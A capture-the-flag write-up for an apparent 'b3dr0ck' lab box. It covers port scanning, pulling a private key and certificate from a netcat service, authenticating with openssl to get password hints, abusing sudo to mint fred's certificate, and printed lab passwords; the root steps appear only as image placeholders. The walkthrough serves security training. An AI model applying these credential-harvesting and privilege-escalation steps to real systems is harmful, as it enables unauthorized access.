### Open Ports 
```bash
rustscan -a 10.10.179.2 -- -A

Open 10.10.179.2:22
Open 10.10.179.2:80
Open 10.10.179.2:4040
Open 10.10.179.2:9009
Open 10.10.179.2:54321

PORT      STATE SERVICE      REASON         VERSION
22/tcp    open  ssh          syn-ack ttl 60 OpenSSH 8.2p1 Ubuntu 4ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 1a:c7:00:71:b6:65:f5:82:d8:24:80:72:48:ad:99:6e (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDdQwFUWf+D4KPrnmLFLvDNxWwfz1KSykszWADhofGMt9/KW1mq5X6Qdx+JnStzc22CC25trfJYOmhyIcZj/lP2zbwCx8+Ng+31XwbnkqR1dzX6Y7KGEQbJeY48bO/nR1dsOnqFPZuKWPzN5dU3CPCYVXoNqYXxM9mJZ+oPW6hcWqD2AoPVmmda82Hir+wWNEtTjcHExY7ZxZI/Z7vsizYsNjJjBld9IGgAHErp/88h07BExG9HE+wqTZw7/JWC5H9xZqapK3wP9gVn+FGN+3JGHKuYKG6ZGc+eRel2XmIVC2PMelF4j2fY0+M8wMpXsa6MJdiyKnJwHC2V13CIvht+L1NMzV9Ajngl8FUwfQhJg46XrcJYnp1tncrA8/Vd5nar0p+9G0ppseBuM9oGB6iGvC3ssE5YFxN35a5g/0pH/JW8GWAAbzaqTxZbGauhPx+bkJIDoMosSovsYITJGi9l2bYGuv1KaJz7q3OcTVvQrBJYlEhxCo0bTwxcHNC90aU=
|   256 3a:b5:25:2e:ea:2b:44:58:24:55:ef:82:ce:e0:ba:eb (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBIFKDczQ8etcHAV4SsMf7e4ObthBEdiU0W4KFMbqAla7taJBkcChWf136WLVnor+e9yXT0ywIK1xKzwq7c5tZus=
|   256 cf:10:02:8e:96:d3:24:ad:ae:7d:d1:5a:0d:c4:86:ac (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB4sG8C6h8Ep0TzcuQinLsiEoA1nY84Gghmr6+sHR+89
80/tcp    open  http         syn-ack ttl 60 nginx 1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to https://10.10.179.2:4040/
4040/tcp  open  ssl/yo-main? syn-ack ttl 60
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-27T00:04:28
| Not valid after:  2026-01-27T00:04:28
| MD5:   de95:450e:7e2d:f810:b04c:d732:2d73:2340
| SHA-1: f8f7:04c5:0699:9a90:180a:23d4:de5e:f78f:890b:cc8d
| -----BEGIN CERTIFICATE-----
| MIICrzCCAZcCFCSdQzdGcadDoDFTSWyAjTl7gjpeMA0GCSqGSIb3DQEBCwUAMBQx
| EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNTAxMjcwMDA0MjhaFw0yNjAxMjcwMDA0
| MjhaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
| ADCCAQoCggEBAJwco0bPQiKP18RMe1n+RSPuCD5FXZhHnjpDZ4Mg93LtFOBGe/+H
| tI0/msIOIcg+o7wuyhjopxu7linthxd5XQfV761aJiHptRPLObNoxp4OvwWs8/JY
| HyjsTWzKQCf7VqetFYkHKQXX4REoGpJSUawO7GXro39AKOjn4GOZk3waETRJtMh6
| 5mdl4l0E5/HqoGAcvv9dUxadoFeAYuksZzFnaD/auHRV/88vMNlREom/AaL42pVb
| yUniQyVHeR7DbjjGiUSlNioEkN/b6f96p3hdmi2EvmFJzBWCA2STl8XKel1UOcuY
| y92q0NsfgPlwM3Fv/99tKudnJJWVS0Igj/sCAwEAATANBgkqhkiG9w0BAQsFAAOC
| AQEAMW5zNkvkZIPeQ86PTbhfzmk88PAfTKauP2vcnvGXpoyOb+6ymgBUtK5C/CYy
| +KMLahKCbg9iVhV1ksa7fT847+SlAf7yvs6Rjl9EHLXq3md2fI2TBWpyiLq4350t
| WaPWSaZCcIjp0yEZldjhI6LuqMxEWRr5lNfT5chWCKmh4o6659nD+TEluRQZ/4LN
| cfPmbXI/LVdDw6vuPrs6bh/b9vbt03JZVa0Zg9mEhB3MwHvX5EZJ7q43eIEL23xo
| QKKhiS07gF6mmHwVVOSG2tRUDWBq6sYLeBJzR6W6KgdgYdT1V36yhnn+w2yotiBW
| M/LRf6p9RB4hMtMitqbdRh7ZDA==
|_-----END CERTIFICATE-----
| tls-alpn: 
|_  http/1.1
|_ssl-date: TLS randomness does not represent time
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Mon, 27 Jan 2025 00:34:25 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|     Need to try and secure
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Content-type: text/html
|     Date: Mon, 27 Jan 2025 00:34:26 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <title>ABC</title>
|     <style>
|     body {
|     width: 35em;
|     margin: 0 auto;
|     font-family: Tahoma, Verdana, Arial, sans-serif;
|     </style>
|     </head>
|     <body>
|     <h1>Welcome to ABC!</h1>
|     <p>Abbadabba Broadcasting Compandy</p>
|     <p>We're in the process of building a website! Can you believe this technology exists in bedrock?!?</p>
|     <p>Barney is helping to setup the server, and he said this info was important...</p>
|     <pre>
|     Hey, it's Barney. I only figured out nginx so far, what the h3ll is a database?!?
|     Bamm Bamm tried to setup a sql database, but I don't see it running.
|     Looks like it started something else, but I'm not sure how to turn it off...
|     said it was from the toilet and OVER 9000!
|_    Need to try and secure
9009/tcp  open  pichat?      syn-ack ttl 60
| fingerprint-strings: 
|   NULL: 
|     ____ _____ 
|     \x20\x20 / / | | | | /\x20 | _ \x20/ ____|
|     \x20\x20 /\x20 / /__| | ___ ___ _ __ ___ ___ | |_ ___ / \x20 | |_) | | 
|     \x20/ / / _ \x20|/ __/ _ \| '_ ` _ \x20/ _ \x20| __/ _ \x20 / /\x20\x20| _ <| | 
|     \x20 /\x20 / __/ | (_| (_) | | | | | | __/ | || (_) | / ____ \| |_) | |____ 
|     ___|_|______/|_| |_| |_|___| _____/ /_/ _____/ _____|
|_    What are you looking for?
54321/tcp open  ssl/unknown  syn-ack ttl 60
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=localhost
| Issuer: commonName=localhost
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2025-01-27T00:04:28
| Not valid after:  2026-01-27T00:04:28
| MD5:   de95:450e:7e2d:f810:b04c:d732:2d73:2340
| SHA-1: f8f7:04c5:0699:9a90:180a:23d4:de5e:f78f:890b:cc8d
| -----BEGIN CERTIFICATE-----
| MIICrzCCAZcCFCSdQzdGcadDoDFTSWyAjTl7gjpeMA0GCSqGSIb3DQEBCwUAMBQx
| EjAQBgNVBAMMCWxvY2FsaG9zdDAeFw0yNTAxMjcwMDA0MjhaFw0yNjAxMjcwMDA0
| MjhaMBQxEjAQBgNVBAMMCWxvY2FsaG9zdDCCASIwDQYJKoZIhvcNAQEBBQADggEP
| ADCCAQoCggEBAJwco0bPQiKP18RMe1n+RSPuCD5FXZhHnjpDZ4Mg93LtFOBGe/+H
| tI0/msIOIcg+o7wuyhjopxu7linthxd5XQfV761aJiHptRPLObNoxp4OvwWs8/JY
| HyjsTWzKQCf7VqetFYkHKQXX4REoGpJSUawO7GXro39AKOjn4GOZk3waETRJtMh6
| 5mdl4l0E5/HqoGAcvv9dUxadoFeAYuksZzFnaD/auHRV/88vMNlREom/AaL42pVb
| yUniQyVHeR7DbjjGiUSlNioEkN/b6f96p3hdmi2EvmFJzBWCA2STl8XKel1UOcuY
| y92q0NsfgPlwM3Fv/99tKudnJJWVS0Igj/sCAwEAATANBgkqhkiG9w0BAQsFAAOC
| AQEAMW5zNkvkZIPeQ86PTbhfzmk88PAfTKauP2vcnvGXpoyOb+6ymgBUtK5C/CYy
| +KMLahKCbg9iVhV1ksa7fT847+SlAf7yvs6Rjl9EHLXq3md2fI2TBWpyiLq4350t
| WaPWSaZCcIjp0yEZldjhI6LuqMxEWRr5lNfT5chWCKmh4o6659nD+TEluRQZ/4LN
| cfPmbXI/LVdDw6vuPrs6bh/b9vbt03JZVa0Zg9mEhB3MwHvX5EZJ7q43eIEL23xo
| QKKhiS07gF6mmHwVVOSG2tRUDWBq6sYLeBJzR6W6KgdgYdT1V36yhnn+w2yotiBW
| M/LRf6p9RB4hMtMitqbdRh7ZDA==
|_-----END CERTIFICATE-----
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port4040-TCP:V=7.95%T=SSL%I=7%D=1/27%Time=6796D491%P=x86_64-pc-linux-gn
SF:u%r(GetRequest,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type:\x20text/htm
SF:l\r\nDate:\x20Mon,\x2027\x20Jan\x202025\x2000:34:25\x20GMT\r\nConnectio
SF:n:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<head>\n\x20\x20
SF:\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\x20\x20\x20\x
SF:20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2035em;\n\x20\
SF:x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20\x20\x20\x20\
SF:x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x20sans-serif;
SF:\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x20\x20</head>\
SF:n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20ABC!</h1>\n\x20
SF:\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n\n\x20\x20\x2
SF:0\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x20a\x20website
SF:!\x20Can\x20you\x20believe\x20this\x20technology\x20exists\x20in\x20bed
SF:rock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helping\x20to\x20se
SF:tup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info\x20was\x20im
SF:portant\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\x20only\x20fi
SF:gured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll\x20is\x20a\x
SF:20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a\x20sql\x20da
SF:tabase,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLooks\x20like\x
SF:20it\x20started\x20something\x20else,\x20but\x20I'm\x20not\x20sure\x20h
SF:ow\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x20was\x20from\
SF:x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20try\x20and\x2
SF:0secure\x20")%r(HTTPOptions,3BE,"HTTP/1\.1\x20200\x20OK\r\nContent-type
SF::\x20text/html\r\nDate:\x20Mon,\x2027\x20Jan\x202025\x2000:34:26\x20GMT
SF:\r\nConnection:\x20close\r\n\r\n<!DOCTYPE\x20html>\n<html>\n\x20\x20<he
SF:ad>\n\x20\x20\x20\x20<title>ABC</title>\n\x20\x20\x20\x20<style>\n\x20\
SF:x20\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20\x20\x20width:\x2
SF:035em;\n\x20\x20\x20\x20\x20\x20\x20\x20margin:\x200\x20auto;\n\x20\x20
SF:\x20\x20\x20\x20\x20\x20font-family:\x20Tahoma,\x20Verdana,\x20Arial,\x
SF:20sans-serif;\n\x20\x20\x20\x20\x20\x20}\n\x20\x20\x20\x20</style>\n\x2
SF:0\x20</head>\n\n\x20\x20<body>\n\x20\x20\x20\x20<h1>Welcome\x20to\x20AB
SF:C!</h1>\n\x20\x20\x20\x20<p>Abbadabba\x20Broadcasting\x20Compandy</p>\n
SF:\n\x20\x20\x20\x20<p>We're\x20in\x20the\x20process\x20of\x20building\x2
SF:0a\x20website!\x20Can\x20you\x20believe\x20this\x20technology\x20exists
SF:\x20in\x20bedrock\?!\?</p>\n\n\x20\x20\x20\x20<p>Barney\x20is\x20helpin
SF:g\x20to\x20setup\x20the\x20server,\x20and\x20he\x20said\x20this\x20info
SF:\x20was\x20important\.\.\.</p>\n\n<pre>\nHey,\x20it's\x20Barney\.\x20I\
SF:x20only\x20figured\x20out\x20nginx\x20so\x20far,\x20what\x20the\x20h3ll
SF:\x20is\x20a\x20database\?!\?\nBamm\x20Bamm\x20tried\x20to\x20setup\x20a
SF:\x20sql\x20database,\x20but\x20I\x20don't\x20see\x20it\x20running\.\nLo
SF:oks\x20like\x20it\x20started\x20something\x20else,\x20but\x20I'm\x20not
SF:\x20sure\x20how\x20to\x20turn\x20it\x20off\.\.\.\n\nHe\x20said\x20it\x2
SF:0was\x20from\x20the\x20toilet\x20and\x20OVER\x209000!\n\nNeed\x20to\x20
SF:try\x20and\x20secure\x20");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port9009-TCP:V=7.95%I=7%D=1/27%Time=6796D479%P=x86_64-pc-linux-gnu%r(NU
SF:LL,29E,"\n\n\x20__\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20__\x20\x20_\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20_\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20____\x20\x20\x20_____\x20\
SF:n\x20\\\x20\\\x20\x20\x20\x20\x20\x20\x20\x20/\x20/\x20\|\x20\|\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\|\x20\|\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20/\\\x20\x20\x20\|\x20\x20_\x20\\\x20/\x20____\|\n\x20\x20\\\x
SF:20\\\x20\x20/\\\x20\x20/\x20/__\|\x20\|\x20___\x20___\x20\x20_\x20__\x2
SF:0___\x20\x20\x20___\x20\x20\|\x20\|_\x20___\x20\x20\x20\x20\x20\x20/\x2
SF:0\x20\\\x20\x20\|\x20\|_\)\x20\|\x20\|\x20\x20\x20\x20\x20\n\x20\x20\x2
SF:0\\\x20\\/\x20\x20\\/\x20/\x20_\x20\\\x20\|/\x20__/\x20_\x20\\\|\x20'_\
SF:x20`\x20_\x20\\\x20/\x20_\x20\\\x20\|\x20__/\x20_\x20\\\x20\x20\x20\x20
SF:/\x20/\\\x20\\\x20\|\x20\x20_\x20<\|\x20\|\x20\x20\x20\x20\x20\n\x20\x2
SF:0\x20\x20\\\x20\x20/\\\x20\x20/\x20\x20__/\x20\|\x20\(_\|\x20\(_\)\x20\
SF:|\x20\|\x20\|\x20\|\x20\|\x20\|\x20\x20__/\x20\|\x20\|\|\x20\(_\)\x20\|
SF:\x20\x20/\x20____\x20\\\|\x20\|_\)\x20\|\x20\|____\x20\n\x20\x20\x20\x2
SF:0\x20\\/\x20\x20\\/\x20\\___\|_\|\\___\\___/\|_\|\x20\|_\|\x20\|_\|\\__
SF:_\|\x20\x20\\__\\___/\x20\x20/_/\x20\x20\x20\x20\\_\\____/\x20\\_____\|
SF:\n\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\n\x20\x20\x20\x20\x20\x20\x20\x20\x2
SF:0\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x
SF:20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\
SF:x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20
SF:\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20\n\
SF:n\nWhat\x20are\x20you\x20looking\x20for\?\x20");
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
```

Then I connect to port 9009 and found
```bash
nc 10.10.179.2 9009



 __          __  _                            _                   ____   _____ 
 \ \        / / | |                          | |            /\   |  _ \ / ____|
  \ \  /\  / /__| | ___ ___  _ __ ___   ___  | |_ ___      /  \  | |_) | |     
   \ \/  \/ / _ \ |/ __/ _ \| '_ ` _ \ / _ \ | __/ _ \    / /\ \ |  _ <| |     
    \  /\  /  __/ | (_| (_) | | | | | |  __/ | || (_) |  / ____ \| |_) | |____ 
     \/  \/ \___|_|\___\___/|_| |_| |_|\___|  \__\___/  /_/    \_\____/ \_____|
                                                                               
                                                                               


What are you looking for? barney.txt
Sorry, unrecognized request: 'barney.txt'

You use this service to recover your client certificate and private key
What are you looking for? key
Sounds like you forgot your private key. Let's find it for you...

-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEAy5UeS6mVrunSaOL2a6sjHmI9rPp05VMgvS4K7quYgk6FYBqd
7iIVpU40heSZCBhHxtXeyNl+CK6ux1vmlB7FrZ8iFpSw43P3O1GOkbbazpOp/Bsg
jEjKKOLIbHp7/JxV+vBDALKUFLfKwc2TeLcFjNE724mO5tZ8I2c1CQIA7iDvwgx5
Grj9HnNPIvaY0EbFaZo2aoQSVaiF08UBxKqASW65Y6nBLuTi8slTY6PxZWft+U4A
SjOh6P5JntIqoAwufNcrkKMxleSrjnRX9h+T0Rt0r3zKwkFALALCNE6fA+IkpJEI
LzDIT/Nze5NaAl7Ot0fwMmF1bWbH56dfjR/lzwIDAQABAoIBAB7GXP0NFr6JRDBs
1tlx1m46ZZ5nghJEnbdbZXWs5PIV0p2ziFo+Ns11ZAU1iFir6vXI0NPF5QKE/ZDP
eKy9dh6H5sxJD/BiUGZcLtQiMzN1KQYeR65NNpo1phyX63RFYc38UfSiCjaTjgf7
/qYJ7MHbw1OtmLeWhs+HQ4IoFmHovawDUDBUyEBO16H01aiCPeV6gqHGdHMg4bZm
tPTCj5a3o/wjsTQx3a1CuwKQMjcF3YXJxhASX+wPStxzNukfLzvofxu3MStuwsf2
CaSMsDYntP741pMAugW5wY/4uTm+FM5kPPJehn9dPZIhGLHIiziUu6tIxsamEIS7
ZVw+1GkCgYEA6V2p6Moq26ynFy8WFqF1WY8RW6idE7yJyyllgkaKeDkO8NQ1nRcR
oo7tTeYa4JtQrREfFXw6KCwd8cLf9jBixBLu3qgieWugTE7NuoETjTbZx02HEsBE
E6QPtRNR13q50qO0DXoj/YUH+rguCfk/xs1GanNdOb7lsl291d7JcAsCgYEA31Pz
cfYkA+gePL0BhD3Bn1W0cbwp3QrVrsWL1K0W5p6RRnxkUV5Dm8i0JJGVCQ64e6al
AuRKC7lvHOyPOiNg80L5GKC17XUg1gszHn0TI1dOcEC1J9Kq5dH81lq7rr4shKNf
Lg/kbtsNCjwUIH4YGwhel8GkBzBhvEqhrGtup80CgYA4hV/+quCAfiumGNhvuMFU
ZKtemNMakaKKG0ejqvQktCUjPTKTDqBNz/I32NCPr+51TF1L9d+cFTtXb8yQsx1o
wfEq6mwXHnMfqEJ5toOGw08xz1w0tW6Hl0faoohC+U2Cb/XPAdMvtwW8utkjv0Os
IdG5PKHKt6qobb3py+DcCwKBgFIUkdolxDDnZA2gzejjpcFBB7Pxm1VRgR3eHzmI
cG1MhEpqt5gsVB7ykjsKgsM0dNuFcQpyC0Dp44u26iFNFXny+IhzsMnYjbv9m8kt
4RXRJdQeBDbht8wF9K535Jkh7kzFmtrcHnIb8lv7ns4eag+tcM7H7dhykMlaiLdN
OPtVAoGAWkeDmQu1PPDTTNXWnf6A1rI2FzaTySGvoVbUuuG3IPRHYqxADMzwhLaZ
oWQ6HTKOO8t58mSzxNceJyKVy7AfHsSq1qhHYcKVqSzelG4prrEXiAlsapNiRER+
8auuSqEoYljhVExQpYlR78rd2dmH/l6WWvV/NG/4rRpUV+wkQS4=
-----END RSA PRIVATE KEY-----


You use this service to recover your client certificate and private key
What are you looking for? certificate
Sounds like you forgot your certificate. Let's find it for you...

-----BEGIN CERTIFICATE-----
MIICoTCCAYkCAgTSMA0GCSqGSIb3DQEBCwUAMBQxEjAQBgNVBAMMCWxvY2FsaG9z
dDAeFw0yNTAxMjcwMDA0NDdaFw0yNjAxMjcwMDA0NDdaMBgxFjAUBgNVBAMMDUJh
cm5leSBSdWJibGUwggEiMA0GCSqGSIb3DQEBAQUAA4IBDwAwggEKAoIBAQDLlR5L
qZWu6dJo4vZrqyMeYj2s+nTlUyC9Lgruq5iCToVgGp3uIhWlTjSF5JkIGEfG1d7I
2X4Irq7HW+aUHsWtnyIWlLDjc/c7UY6RttrOk6n8GyCMSMoo4shsenv8nFX68EMA
spQUt8rBzZN4twWM0TvbiY7m1nwjZzUJAgDuIO/CDHkauP0ec08i9pjQRsVpmjZq
hBJVqIXTxQHEqoBJbrljqcEu5OLyyVNjo/FlZ+35TgBKM6Ho/kme0iqgDC581yuQ
ozGV5KuOdFf2H5PRG3SvfMrCQUAsAsI0Tp8D4iSkkQgvMMhP83N7k1oCXs63R/Ay
YXVtZsfnp1+NH+XPAgMBAAEwDQYJKoZIhvcNAQELBQADggEBAEAlF1G5NbyLembC
omu2zi7dcXl6ToiZs8rve77fQhEyUartK87akl10tFqcVnKD53U9n2Rk2S5QhJbB
tqeQUppTlQBti9ms/7dpZ5kCtjzYXVwGf6h5U4AT7Vzghvz05qDZt0IJ4Dmv4/mv
43h4+dF/Qo7HXBpbVuiR+1qwo0N8M7fsx/S97ZoYQgsOTozvT5hX+/TLTyybwiy5
cyrQPWIKZcpy4LIaWrfk+aCwQJNZ8IDXJFgBvpvdlW1t3nfSYpc0G7vZbm7AVbDS
Y4l0Ss+Y8pmUQfTzCq2q+OgAteZl3iqZNjxmeEOl78fg26S8xFs2rAExR2Nc68IS
8iStBcE=
-----END CERTIFICATE-----

```
I saved the certificate and key in two separate file and using `openssl` I conneted to the port 54321.
```bash
openssl s_client -connect 10.10.179.2:54321 -key some.key -cert some.cert -brief

Connecting to 10.10.179.2
Can't use SSL_get_servername
depth=0 CN=localhost
verify error:num=18:self-signed certificate
CONNECTION ESTABLISHED
Protocol version: TLSv1.3
Ciphersuite: TLS_AES_256_GCM_SHA384
Requested Signature Algorithms: ECDSA+SHA256:ECDSA+SHA384:ECDSA+SHA512:Ed25519:Ed448:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA-PSS+SHA256:RSA-PSS+SHA384:RSA-PSS+SHA512:RSA+SHA256:RSA+SHA384:RSA+SHA512:ECDSA+SHA224:ECDSA+SHA1:RSA+SHA224:RSA+SHA1
Peer certificate: CN=localhost
Hash used: SHA256
Signature type: RSA-PSS
Verification error: self-signed certificate
Server Temp Key: X25519, 253 bits


 __     __   _     _             _____        _     _             _____        _ 
 \ \   / /  | |   | |           |  __ \      | |   | |           |  __ \      | |
  \ \_/ /_ _| |__ | |__   __ _  | |  | | __ _| |__ | |__   __ _  | |  | | ___ | |
   \   / _` | '_ \| '_ \ / _` | | |  | |/ _` | '_ \| '_ \ / _` | | |  | |/ _ \| |
    | | (_| | |_) | |_) | (_| | | |__| | (_| | |_) | |_) | (_| | | |__| | (_) |_|
    |_|\__,_|_.__/|_.__/ \__,_| |_____/ \__,_|_.__/|_.__/ \__,_| |_____/ \___/(_)
                                                                                 
                                                                                 

Welcome: 'Barney Rubble' is authorized.
b3dr0ck> info
Unrecognized command: 'info'

This service is for login and password hints
b3dr0ck> login
Login is disabled. Please use SSH instead.
b3dr0ck> password hints
Password hint: d1ad7c0a3805955a35eb260dab4180dd (user = 'Barney Rubble')
b3dr0ck> login hints
Login is disabled. Please use SSH instead.
b3dr0ck> 
```
Using that hint password I connected to the ssh as barney user and obtained the barney.txt flag.
![[b3dr0ck1.png]]
I went to the `/usr/share/abc/certs` directory and found the following but all of them need root access.
![[b3dr0ck2.png]]
And `sudo -l` give me the following 
![[b3dr0ck3.png]]
Using sudo command I generated a key and certificate for fred 
![[b3dr0ck4.png]]
I saved the certificate and key in fred.cert and fred.key respectively and using openssl I logged as fred and obtained fred's ssh password `YabbaDabbaD0000!`.

![[b3dr0ck5.png]]
Then I logged in as fred and obtained the fred's flag.
![[b3dr0ck6.png]]
#### Being root
![[b3dr0ck7.png]]
![[b3dr0ck8.png]]
![[b3dr0ck9.png]]
The root password is: `flintstonesvitamins`
![[b3dr0ck10.png]]
